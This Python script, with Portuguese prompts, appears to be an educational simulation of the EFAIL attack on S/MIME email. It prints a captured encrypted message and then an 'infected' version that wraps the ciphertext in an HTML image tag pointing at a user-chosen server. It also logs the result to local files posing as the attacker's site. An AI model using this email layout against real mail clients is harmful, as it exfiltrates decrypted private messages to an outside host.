#Feito por David Alves em 08-01-2019
from cryptography.fernet import Fernet
import time


file2=open("msg.txt","rb+")
msg=file2.read()
print("Bem-vindo ao EFAIL")
print(":::::::::::::::::::::::::::::::::::::::::::::::")
print("O seguinte e-mail foi capturado:")
time.sleep(2)
print("-----------------------------------------------------------------------")
print("From:Alice@gmail.com")
print("To:Bob@gmail.com")
print('Content-Type:multipart/mixed;boundary="BOUNDARY"')
print("--BOUNDARY")
print("Content-Type: application/pcks7-mime;")
print("   smime-type=enveloped-data")
print("Content-Transfer-Encoding:base64")
print("")
print(msg)
print("--BOUNDARY")
print("-----------------------------------------------------------------------")

time.sleep(2)
print("Agora, diz qual o endereço do servidor para o qual queres reencaminhar as mensagens:")
site= input().encode()
print("A infectar mensagem ...")
time.sleep(3)

print("OK, o seguinte e-mail infectado vai ser enviado para o Bob:")
time.sleep(2)
print("-----------------------------------------------------------------------")
print("From:Alice@gmail.com")
print("To:Bob@gmail.com")
print("--BOUNDARY")
print("Content-Type: text/html")
print("")

print('<img src="',site.decode(),'"')

site_lista=open("lista.txt","r")
lista=site_lista.read()
site_lista.close()

if(site.decode() in lista ):
	print("--BOUNDARY")
	print('Content-Type:multipart/mixed;boundary="BOUNDARY"')
	print("--BOUNDARY")
	print("Content-Type: application/pcks7-mime;")
	print("   smime-type=enveloped-data")
	print("Content-Transfer-Encoding:base64")
	print("")
	print(msg)
	print("--BOUNDARY")
	print("Content-Type: text/html")
	print('">')
	print("--BOUNDARY")
	print("-----------------------------------------------------------------------")
	new=msg+site
	file2.write(new)

else:
	sitef=open('%s' % site.decode(),"w")
	sitef.write("--------------------------------------------------------------------\n")
	sitef.write("----------------BEM-VINDO A PAGINA DE ADMINISTRACAO-----------------\n")
	sitef.write("----------------DO SITE  %s ----------------------------------------\n" % site.decode().upper())
	sitef.write("ESTES FORAM OS ACESSOS QUE HOUVE NO SEU SITE:\n")
	print("--BOUNDARY")
	print('Content-Type:multipart/mixed;boundary="BOUNDARY"')
	print("--BOUNDARY")
	print("Content-Type: application/pcks7-mime;")
	print("   smime-type=enveloped-data")
	print("Content-Transfer-Encoding:base64")
	print("")
	print(msg)
	print("--BOUNDARY")
	print("Content-Type: text/html")
	print('">')
	print("--BOUNDARY")
	print("-----------------------------------------------------------------------")
	new=msg+site
	file2.write(new)
		
	site_lista=open("lista.txt","a")
	site_lista.write(site.decode())
	site_lista.close()


